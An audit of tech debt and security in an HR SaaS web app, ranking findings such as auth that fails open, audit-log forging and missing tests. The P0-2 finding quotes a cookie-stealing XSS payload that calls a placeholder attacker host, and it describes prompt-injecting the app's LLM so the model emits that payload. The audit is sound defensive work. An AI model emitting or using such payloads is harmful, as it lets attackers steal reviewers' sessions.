# AI HR Pilot — Tech Debt Audit (July 2026)

_Read-only audit run 2026-07-19 against `main`, HEAD `01fe03e`. Scope covers the full app (24 API routes, 16 app pages, `lib/` helpers, `proxy.ts`, config)._

## Executive summary

The June-July hardening push (server-derived `orgId`, plan enforcement, fail-closed Stripe webhook, Vitest suite, Sentry) landed a genuinely credible security posture: every data route reads its tenant from `guard.session.orgId` and the auth boundary sits at the API, not the client. That work is real and worth defending.

The remaining risk is concentrated in a few high-impact places rather than spread across the codebase. The three most urgent findings are: (1) `getSessionRole()` silently drops to `hr_admin` demo mode when Clerk throws, which can be triggered by any transient Clerk outage in production; (2) `/api/tickets` renders `ticket.aiResponse` via `dangerouslySetInnerHTML` without DOMPurify — stored XSS via prompt injection is trivially possible for any user who then opens the ticket; and (3) `/api/audit` POST accepts client-supplied `userName` and `userRole`, allowing any signed-in employee to forge audit-log entries against another user's identity — a straight compliance breach for an HR product.

Test coverage exists (4 files, all pure business logic — plans, policy-search, rag chunking, risk-scorer) but every API route, RBAC helper, and tenancy contract is untested. That is the single most leveraged place to invest engineering time before an enterprise sale, because none of the P0/P1 items below would have shipped past a real test suite.

---

## P0 — must fix before enterprise sales

### P0-1. `getSessionRole()` fails open to `hr_admin` on any Clerk error
- **File:** `lib/auth/rbac.js:71-74`
- **Why P0:** The outer `try { const { userId } = await auth(); ... } catch { return { role: "hr_admin", orgId: "default", demo: true }; }` treats every thrown error from `auth()` as "demo mode". `requireRole()` at line 90 then short-circuits: `if (session.demo) return { session, error: null };`. A transient Clerk API failure, a mis-signed session token, or a keys drift like the one described in `COMMERCIAL_READINESS.md` P0-1 will silently grant unauthenticated callers full `hr_admin` in the caller's session. Every data route becomes cross-org readable at that moment.
- **Fix effort:** S
- **Suggested approach:** Gate `demo` on `process.env.NODE_ENV !== "production" && !process.env.CLERK_SECRET_KEY`, not on `catch`. In production, an `auth()` throw must return a 500 (or a hard 401), never a synthetic admin session. Add a Vitest that stubs `auth()` to throw and asserts `requireRole("hr_admin")` returns a 4xx/5xx `error`.

### P0-2. Stored XSS: `/tickets` renders LLM output without sanitization
- **File:** `app/(app)/tickets/page.jsx:96` (`dangerouslySetInnerHTML={{ __html: ticket.aiResponse }}`)
- **Why P0:** `ticket.aiResponse` is LLM output persisted from `/api/chat` and later re-rendered by any hr_staff/legal/hr_admin who opens the ticket. The chat page correctly wraps the same content in `DOMPurify.sanitize` (`app/(app)/chat/page.jsx:383`), but the ticket page does not. Any employee can prompt-inject the LLM into emitting `<img src=x onerror=fetch("//attacker/"+document.cookie)>` and it will fire in the HR reviewer's browser. This is stored XSS crossing a privilege boundary.
- **Fix effort:** S
- **Suggested approach:** Import `DOMPurify` (already in `package.json`) and wrap the render exactly as chat does. Better: centralize a `<SafeHtml>` component in `components/ui/` so future renders can't forget. Add a Vitest snapshot proving `<script>` and `onerror=` survive round-trip only as inert text.

### P0-3. `/api/audit` accepts client-supplied identity for audit entries
- **File:** `app/api/audit/route.js:44-51`
- **Why P0:** The POST body is `{ entry: { action, detail, level, userName, userRole, metadata, ipAddress } }` and `entry` is passed straight to `createAuditEntry(orgId, entry)`. Any authenticated `employee` can post `userName: "Yuri Kruman", userRole: "hr_admin", action: "PLAN_UPGRADED"` and forge an entry attributed to an admin. The audit log is the compliance artifact for HR investigations — forging it defeats the entire purpose of the table.
- **Fix effort:** S
- **Suggested approach:** Overwrite `userName`, `userRole`, `userId`, `ipAddress` from `guard.session` (`user?.name`, `role`, `user?.id`, `request.headers.get("x-forwarded-for")`) before calling `createAuditEntry`. Do not merge the client's version. Also validate `action` against an enum of known audit actions.

### P0-4. `/api/self-service` accepts client-supplied `userId` on POST and GET
- **File:** `app/api/self-service/route.js:38,71,142`
- **Why P0:** POST reads `userId` from the request body and stores it as `user_id` on the created request — so an employee can file a leave request attributed to another employee's user row, or an info-update request pointed at someone else's HR record. GET reads `userId` from the query string with no ownership check, so an employee can list any coworker's requests in their org.
- **Fix effort:** S
- **Suggested approach:** Ignore body/querystring `userId`; use `guard.session.user?.id` as the authoritative filter and writer for `employee`-level callers. HR staff can be allowed to filter by any userId within `guard.session.orgId`.

### P0-5. Schema drift: `/api/setup` and `/api/health` don't know about `self_service_requests` or `document_chunks`
- **Files:** `app/api/setup/route.js:25-37`, `app/api/health/route.js:30-34`
- **Why P0:** `EXPECTED_TABLES` in both routes lists 11 tables. `lib/db/schema.sql` defines 13 (adds `self_service_requests` at line 258 and `document_chunks` at line 287). The verifier reports `status: "ready"` and `needsSetup: false` even when those tables are missing — meaning a fresh Neon can pass setup, but self-service and RAG will 500 in production with no early warning. This was the failure mode the WebSocket-vs-HTTP DDL note in `schema.sql:1-27` was trying to prevent, but the check itself was never updated when the tables were added.
- **Fix effort:** S
- **Suggested approach:** Add both tables to `EXPECTED_TABLES` in both files; extract into a shared `lib/db/expected-tables.js` so a future addition can only be missed once. Consider generating this list at build time from `schema.sql`.

### P0-6. Any authenticated user can rate any ticket in their org
- **File:** `app/api/tickets/route.js:111-121`
- **Why P0:** The `rate` action requires only `requireRole("employee")` and passes `ticketId` straight to `updateTicketSatisfaction(orgId, ticketId, satisfaction)` — no check that the ticket belongs to the calling user. An employee can rate every other employee's ticket 1 (or 5) and materially poison the CSAT metric that becomes an enterprise reporting artifact.
- **Fix effort:** S
- **Suggested approach:** Before update, `SELECT user_id FROM tickets WHERE id = ${ticketId} AND org_id = ${orgId}` and assert `user_id === guard.session.user?.id`; hr_staff/hr_admin may rate on anyone's behalf.

---

## P1 — should fix in next 2 weeks

### P1-1. `/api/health` is unauthenticated and enumerates the entire infra surface
- **File:** `app/api/health/route.js:38-128`
- **Why P1:** Returns a full inventory of which services are configured (`clerk`, `stripe`, `resend`, `blob`, `llm`, `webhookConfigured`) plus missing table names, DB latency, and Node env. That's a free reconnaissance response for an attacker: they now know Stripe is configured but the webhook isn't, or that Sentry is off, or which tables to try SQL injection against. `COMMERCIAL_READINESS.md` P2-3 flagged this in June and it's still open.
- **Fix effort:** S
- **Suggested approach:** Return `{ ok, timestamp }` publicly. Gate the detailed body behind either `requireRole("hr_admin")` or the same `SETUP_SECRET` bearer already used by `/api/setup`. Vercel Health Checks can still verify `ok`.

### P1-2. `/api/drip/event` is fully public with no validation
- **File:** `app/api/drip/event/route.js` (whole file, 28 lines)
- **Why P1:** The proxy exempts `/api/drip(.*)` from auth. `/enroll` has a per-instance rate limiter and email regex; `/event` has neither. `type` is any string, `payload` is any object, both are forwarded to the drip engine which trusts our server-to-server auth. A single attacker can spam events, distort funnel analytics, or use us as a laundering hop toward the drip engine.
- **Fix effort:** S
- **Suggested approach:** Copy the sliding-window rate limiter from `drip/enroll/route.js`, enum-validate `type` against a known list, cap payload JSON size (`<= 4KB`), and reject anything that isn't shaped like a known event.

### P1-3. `/api/webhooks/clerk` allows unsigned payloads in non-production
- **File:** `app/api/webhooks/clerk/route.js:71-77`
- **Why P1:** When `NODE_ENV !== "production"` AND `CLERK_WEBHOOK_SECRET` is unset AND `CLERK_WEBHOOK_SECRET_SKIP_VERIFY !== "true"`, the code hits the `else if (!webhookSecret && !skipVerify)` branch, logs a warning, and PROCESSES THE WEBHOOK anyway. Preview environments and staging routinely have missing secrets and are internet-reachable — an attacker can inject fake user/org rows into the shared Neon (or into whatever DB the preview points at) and the DB will happily upsert.
- **Fix effort:** S
- **Suggested approach:** In any environment where `CLERK_WEBHOOK_SECRET` is unset and skip-verify is not explicit, refuse (503). Never process an unsigned webhook silently. The `isProd && !webhookSecret` guard at line 50 has the right shape — extend it to `!skipVerify && !webhookSecret`.

### P1-4. `/api/webhooks/clerk` is largely dead code duplicated by `/api/bootstrap`
- **Files:** `app/api/webhooks/clerk/route.js` (whole file, 185 lines) vs. `app/api/bootstrap/route.js:1-18`
- **Why P1:** The bootstrap route header explicitly says "Replaces the Clerk webhook for user/org/role provisioning so we do NOT need a paid Clerk plan (webhooks are Pro-only)." Yet the webhook file still ships, still runs its own auto-`hr_admin` assignment (which conflicts with bootstrap's), and is exempted in `proxy.ts`. Two divergent code paths that provision the same rows is a bug pipeline: one edit lands in one place and the other silently keeps its stale logic. It also doubles the surface for P1-3 above.
- **Fix effort:** M
- **Suggested approach:** Confirm with owner whether the Clerk plan will ever be upgraded to Pro (webhook-eligible). If not, delete the webhook route and its `proxy.ts` allowlist entry. If yes, delete the bootstrap route and use the webhook exclusively; the two implementations must not coexist.

### P1-5. `requireOrgMatch` exists but is called nowhere
- **File:** `lib/auth/rbac.js:123-131` (defined), zero call sites in `app/`
- **Why P1:** Every current route derives orgId from the session, which is the correct fix — but the helper that exists to defend against `orgId` slipping in from the body/URL is not wired up. If a future route ever accepts `orgId` from the client (someone will), there's no defense-in-depth. `COMMERCIAL_READINESS.md` P0-4 explicitly called for adding it.
- **Fix effort:** S
- **Suggested approach:** Either delete `requireOrgMatch` as dead code (leaner is better), or add it as a smoke test that every mutating route calls it with `body.orgId ?? null` so future routes gain the protection by default. Add a lint rule or CI grep to enforce.

### P1-6. `/documents` shows fake DEMO_DOCS to real signed-in users
- **File:** `app/(app)/documents/page.jsx:55,67-73`
- **Why P1:** If a real Clerk user's org has zero documents in Neon, the page keeps showing the demo doc list ("If Neon is empty, keep showing demo docs"). A brand-new customer thinks they already have "Anti-Harassment Policy 2026" in their handbook. The June-hardening `COMMERCIAL_READINESS.md` P1-4 handled the topbar; this page was missed.
- **Fix effort:** S
- **Suggested approach:** Only seed from `DEMO_DOCS` when `data.demo === true` (i.e., DB is truly unavailable). For real orgs with zero docs, render an empty state that pushes the upload CTA.

### P1-7. API Keys feature is deployed but never validated anywhere
- **Files:** `app/api/api-keys/route.js` (whole file), `components/layout/Sidebar.jsx:44-45`
- **Why P1:** Keys are generated correctly (crypto.randomBytes, SHA-256 hashed, prefix stored) and the sidebar acknowledges "API Keys hidden until an authenticated public API exists: keys were generated and hashed correctly but nothing validated them". But `/api/api-keys` is still POST-able by any `hr_admin`, so customers can generate keys that don't authenticate anything. This is worse than hidden: it's a demo-credibility trap the moment a buyer's tech team notices.
- **Fix effort:** M
- **Suggested approach:** Either ship the API-key middleware (add a `lib/auth/api-key.js` that hashes the `Authorization: Bearer pp_live_...` header and matches against `api_keys.key_hash`, then let selected `/api/*` routes accept either Clerk or API-key auth) or hide the entire feature (delete route, hide page, drop table). Do not leave "generates keys that don't do anything" in front of enterprise buyers.

### P1-8. Escalation + invite emails inject unescaped user input into HTML
- **File:** `lib/email.js:20-60` (`escalationHtml` template literal), `lib/email.js:122-148` (`sendInviteEmail`)
- **Why P1:** `${ticket.query}`, `${ticket.employee}`, `${ticket.department}`, `${ticket.category}` are interpolated raw into the email HTML. The invite email interpolates `${roleLabel}` (server-derived, safe) but the pattern is the same. Employees can craft queries that break the email layout, plant misleading links, or embed hidden images/pixels. Less severe than the ticket-page XSS because email clients render conservatively, but still user-controlled HTML in outbound mail.
- **Fix effort:** S
- **Suggested approach:** Introduce a tiny `escape(str)` (5 lines) that maps `<>&"'` to entities and wrap every interpolation. Or use a proper template library. Same treatment for `sendInviteEmail`.

### P1-9. Integration `config` JSONB stores tokens/secrets in cleartext
- **Files:** `lib/db/schema.sql:177-190`, `lib/db/index.js:325-339`
- **Why P1:** The schema comment "encrypted at rest by Neon" is true (disk-level) but the application never encrypts before write. A DB dump, a Neon support engineer, or a compromised Neon session reveals OAuth refresh tokens for BambooHR/Workday/Slack/etc. in plain JSON. Enterprise procurement will ask about this.
- **Fix effort:** M
- **Suggested approach:** Add `lib/crypto/envelope.js` that AES-GCM-encrypts `config.secrets.*` with a `INTEGRATION_ENCRYPTION_KEY` env var (32 bytes, rotated per environment). Only the fields marked as secrets need encryption; the rest of `config` can stay searchable.

### P1-10. Sensitive mutations don't hit the audit log
- **Files:** `app/api/tickets/route.js` (POST + PATCH — no `createAuditEntry`), `app/api/documents/route.js` (DELETE), `app/api/team/route.js` (POST + PATCH), `app/api/cases/route.js` (POST + PATCH), `app/api/settings/route.js` (PATCH)
- **Why P1:** Only 5 routes write audit entries (`api-keys`, `audit`, `integrations`, `regulatory-reviews`, `webhooks/stripe`). Creating a case, escalating a ticket, deleting a document, or changing a teammate's role does not appear in `audit_log`. That's exactly the surface an HR-compliance auditor will ask about first.
- **Fix effort:** M
- **Suggested approach:** Wrap `createAuditEntry` into a `lib/audit.js` helper with typed actions, then call it from each mutating route. Keep the helper fire-and-forget so it never blocks the primary operation.

### P1-11. Chat rate limit is bypassable when the user has no DB row
- **File:** `app/api/chat/route.js:209-221`
- **Why P1:** The DB-backed sliding window only runs when `userId` is non-null. Right after signup, a user's Clerk record exists but the Neon `users` row may not yet — `getUserByClerkId` returns null, `session.user?.id` is null, and the rate limiter is skipped. New signups can burn unlimited LLM tokens.
- **Fix effort:** S
- **Suggested approach:** Fall back to a Clerk-ID + IP-address keyed limiter (per-instance sliding window like `/api/drip/enroll`) when the DB user isn't provisioned yet. Alternatively, force provisioning to complete before the first `/api/chat` call.

### P1-12. `inviteUser` accepts client-supplied `clerkId`
- **File:** `lib/db/index.js:221-244`, called from `app/api/team/route.js:72`
- **Why P1:** POST `/api/team` body flows into `inviteUser(orgId, user)` and the DB helper writes `clerk_id: userData.clerkId`. An admin (currently the only role allowed here) could plant an arbitrary `clerk_id` on a pre-created row so that when a target Clerk user signs up, they get bound to a foreign org's user record. Limited blast radius because it requires admin, but wrong shape — the client should never be able to name a Clerk ID.
- **Fix effort:** S
- **Suggested approach:** Strip `clerkId` from the accepted invite payload in `/api/team/route.js`; it should only ever be set by the webhook/bootstrap flow when the invited user actually signs up.

### P1-13. `chat_messages` index doesn't cover the rate-limit query
- **Files:** `lib/db/schema.sql:204-205`, `lib/db/index.js:584-593` (`countRecentChatMessages`)
- **Why P1:** The index is `(org_id, user_id, created_at DESC)`. The rate-limit query filters `role = 'user'` too. Under load, this becomes a heap scan on the matched rows. It's silent until a chatty org grows and the rate-limit call starts eating the whole request budget.
- **Fix effort:** S
- **Suggested approach:** Add `CREATE INDEX idx_chat_rate_limit ON chat_messages(org_id, user_id, role, created_at DESC);` — or narrow it with a `WHERE role = 'user'` partial index.

### P1-14. Test coverage is limited to pure functions; no route/RBAC/tenancy tests
- **Files:** `tests/plans.test.js`, `tests/policy-search.test.js`, `tests/rag.test.js`, `tests/risk-scorer.test.js`
- **Why P1:** Every P0/P1 above would have been caught by a smoke test at the route level. The current suite is well-written but covers only pricing math, keyword search, embedding chunking, and risk scoring — none of the security boundaries.
- **Fix effort:** L
- **Suggested approach:** See the dedicated section below.

---

## P2 — nice to have / good hygiene

- **P2-1. Comment lies in `RouteGuard.jsx:10-11`** — "the LAST line of defense before real server-side auth (Clerk) is added" is factually wrong now that `requireRole` is on every route. Update to reflect that it's a UX blocker only.
- **P2-2. `AppShell.jsx` is 639 lines** — `LoginScreen` (lines 129-281) should live in its own file; `DEMO_USERS` (95-103) too. Both are demo-only concerns that will grow if left inline.
- **P2-3. `EXPECTED_TABLES` duplicated in `/api/setup` and `/api/health`** — extract to `lib/db/expected-tables.js`. Same fix as P0-5.
- **P2-4. Hardcoded Stripe account ID `acct_18V7JzK4OdZVtHRP`** at `lib/stripe-account.js:17` — account IDs aren't secrets, but source-committed fallbacks make environment migration painful. Prefer failing loudly if `STRIPE_ACCOUNT_ID` is missing.
- **P2-5. Custom markdown renderer in `app/(marketing)/blog/[slug]/page.jsx:60-181` is ~180 lines** — replace with `marked` or `remark`. It works, but every future edge case (tables, code fences, links) is a bug-farming opportunity.
- **P2-6. Client sends `orgId` in URL query strings** — every page passes `?orgId=…`, e.g. `app/(app)/analytics/page.jsx:37`. The server ignores it now (good), but query-string tenant IDs land in browser history, referrer headers, and access logs. Drop them client-side to reduce log-scraping surface.
- **P2-7. Escalation email sent as a fire-and-forget promise from `/api/tickets` POST** — if `getOrgSettings` throws, the promise rejects silently in the log. Same pattern in audit and integration writes. It works today, but there's no retry queue or DLQ if Resend goes down at the wrong minute.
- **P2-8. `cases.notes` and `cases.documents` are unbounded JSONB arrays** — grows without any per-note query capability, no pagination, and re-writes the whole array on every append. Fine at 10 notes/case; catastrophic at 1000. Consider `case_notes` (already a table) for cases too.
- **P2-9. `console.log` in webhooks and email helpers logs emails and role transitions** — low PII risk, but Vercel logs are visible to anyone with project access. Consider redacting emails or moving to structured logs.
- **P2-10. `NEXT_PUBLIC_APP_URL` defaulted to `https://aihrpilot.com` in `lib/email.js:18,107`** — if the env var isn't set on a preview environment, invite links point at production. Fail loudly instead.
- **P2-11. CSP `script-src 'unsafe-inline' 'unsafe-eval'`** in `next.config.mjs` — probably required by Next.js/Turbopack today, but revisit periodically. `frame-ancestors 'none'` and other directives are good.
- **P2-12. `.env.local` present in the repo** — checked, correctly gitignored. Confirm no accidental commit in history via `git log --all --full-history -- .env.local`.

---

## Test coverage gaps — the 10 highest-leverage tests to add first

Ranked by "what single test would have caught the most damage."

1. **`getSessionRole()` fails closed on Clerk error** — stub `auth()` to throw; assert `requireRole("employee")` returns 4xx/5xx, NOT a demo hr_admin session. Would catch P0-1.
2. **`/api/audit` POST cannot forge `userName`/`userRole`** — POST as an employee with body `userName: "attacker", userRole: "hr_admin"`; assert the persisted row shows the session's identity, not the body's. P0-3.
3. **`/api/self-service` POST/GET respects session `userId`** — employee A submits with body `userId: <userB.id>`; assert the row stores A's id. GET with `?userId=<userB.id>`; assert 403 or filtered result. P0-4.
4. **`/api/tickets` PATCH `rate` blocks cross-user rating** — employee A creates a ticket; employee B calls `PATCH /api/tickets` with A's ticketId + `action: "rate"`; assert 403. P0-6.
5. **Cross-org read denial contract** — user in org A calls every `GET /api/{tickets,cases,documents,audit,team,settings}` and receives only org A rows even if body/URL says orgB. This is `COMMERCIAL_READINESS.md` P0-5's promised test and it still isn't there.
6. **`/api/chat` sanitizes output for ticket surface** — post a query that would emit `<script>` if the LLM plays along; assert the stored `ticket.aiResponse` is escaped/sanitized before persistence (or, if sanitization stays render-side, that the ticket page test snapshot renders the tag as text).
7. **`/api/team` POST cannot plant an arbitrary `clerkId`** — admin POSTs `user: { ..., clerkId: "user_foreign" }`; assert the persisted `clerk_id` is null (or the endpoint rejects). P1-12.
8. **Setup verifier includes every DDL table** — read `lib/db/schema.sql`, extract all `CREATE TABLE` names, assert each is in `EXPECTED_TABLES`. Would prevent P0-5 forever.
9. **Rate limit engages before user is DB-provisioned** — call `/api/chat` `CHAT_RATE_LIMIT + 1` times as a Clerk user with no `users` row; assert the last call is a 429. P1-11.
10. **Webhook rejects unsigned payloads outside of explicit skip mode** — POST a fake Clerk payload with no Svix headers to `/api/webhooks/clerk` when `CLERK_WEBHOOK_SECRET_SKIP_VERIFY !== "true"`; assert 4xx and no DB write. P1-3.

Infrastructure that would make these tests cheap to write: a `tests/harness.js` that boots a Vitest environment with a mocked `@clerk/nextjs/server` (settable `userId` + `sessionClaims`) and a `sql` mock that records writes, plus one real integration test against a scratch Neon branch for the tenancy contract.

---

## Positive findings — what's genuinely well-built

- **Server-derived `orgId` is enforced consistently.** Every data route reads `guard.session.orgId` and only `guard.session.orgId`. The client sending `orgId` in the body is now cosmetic noise, not a security bypass. This is a real improvement over most B2B SaaS at the same stage.
- **Stripe webhook is fail-closed and signature-verified.** `constructEvent` throws on invalid signatures and returns 400; server-side price resolution from `lib/data/plans.js` closes the "customer supplies price" hole. The `withAccount()` helper for org-level keys is a nice touch.
- **API keys are hashed with SHA-256 and only the prefix + raw key are returned once.** The generation code is correct; it just isn't used. When the validation middleware ships, no schema change is needed.
- **RAG pipeline degrades gracefully.** Missing OIDC token → no embeddings → keyword search still works. Never throws on ingestion; upload succeeds even if indexing fails. That's the right shape for a resilience story.
- **Rate limiting on `/api/chat` uses a DB-backed sliding window that survives cold starts** — this is the correct pattern for serverless, and better than the in-memory `Map` in `/api/drip/enroll`.
- **CSP is thought-through.** `frame-ancestors 'none'`, HSTS, referrer policy, Permissions-Policy — a real security baseline, not a copy-paste template.
- **`bootstrap` provisions role + org + Neon rows atomically per user.** The "$1000 per Clerk Pro seat we won't pay" workaround is well-executed and idempotent.
- **Sentry `beforeSend` strips request body and cookies.** Correct default; means PII from HR queries never lands in the error tracker even if a route throws mid-request.
- **DDL transport learning is documented in `schema.sql:1-27`.** That WebSocket-vs-HTTP note prevents the next engineer from burning the same day. This kind of embedded, load-bearing comment is genuinely good practice.

---

## Meta observations

- **Every route re-implements the same shape.** `const guard = await requireRole(...); if (guard.error) return guard.error; if (!isDbAvailable()) return NextResponse.json({...demo:true}); try { ... } catch (err) { console.error(...); return NextResponse.json({error:...},{status:500}); }` appears identically in ~20 files. Extract into `lib/http.js`: `withAuth("hr_admin", async (session, request) => ...)` that handles error boxing, demo-mode fallback, and consistent error shape.
- **`EXPECTED_TABLES` is copied in two files and out-of-sync with `schema.sql`.** Whenever two files must agree by convention, they eventually don't. Same pattern for `PLAN_SLUGS`/`PLAN_NAMES`/`PLAN_LIMITS` living in three files (`lib/auth/plan.js`, `lib/data/plans.js`, `app/api/webhooks/stripe/route.js` and `app/api/billing/route.js`) — one source of truth.
- **Auth is enforced at the API but the client still sends `orgId` everywhere.** The dead payload increases the odds of a future engineer wiring it back into a helper "for consistency." Delete the client-side sends now while the pattern is fresh.
- **The demo/production distinction is ambient.** `session.demo`, `isDbAvailable()`, `HAS_LLM`, `HAS_STRIPE`, `CLERK_ENABLED` are checked ad hoc in every file. Consolidate into a single `getEnv()` that returns a typed environment descriptor once per request.
- **Comments have started to lie.** `RouteGuard.jsx` and `COMMERCIAL_READINESS.md`'s status of P0/P1 items are out of sync with the code. Set a habit: whenever a comment describes intent, update or delete it in the same commit as the code it references.
- **The webhook/bootstrap duplication is a symptom of a deeper decision debt.** Either pay for Clerk Pro and use webhooks, or commit to the bootstrap-per-request model and delete the webhook. The current "both exist, one is theoretically preferred" state guarantees drift.
- **`AppShell.jsx` is doing three jobs.** Auth context, demo login screen, and app-wide state provider. When it hits 800 lines (soon), it will become impossible to reason about which effect runs when.

---

## Effort summary

| Priority | Item count | Est. total effort |
| --- | --- | --- |
| P0 | 6 | ~1.5 days (all S) |
| P1 | 14 | ~5-7 days (mostly S, three M, one L for tests) |
| P2 | 12 | ~2-3 days incremental |
| Highest-leverage tests | 10 | ~2 days once harness exists |

Recommended sequence: P0-1 through P0-6 today (they're all S). Then test 1, 2, 3, 4 tomorrow (would freeze the fixes in place). Then P1-1 through P1-4 (health, drip, webhook cleanup) as one focused session. Then the observability + audit-log work (P1-10 + P2-9). Then the rest of P1.

Report path: `C:\Users\yurik\Downloads\policypilot-ai\TECH_DEBT_AUDIT_2026_07.md`
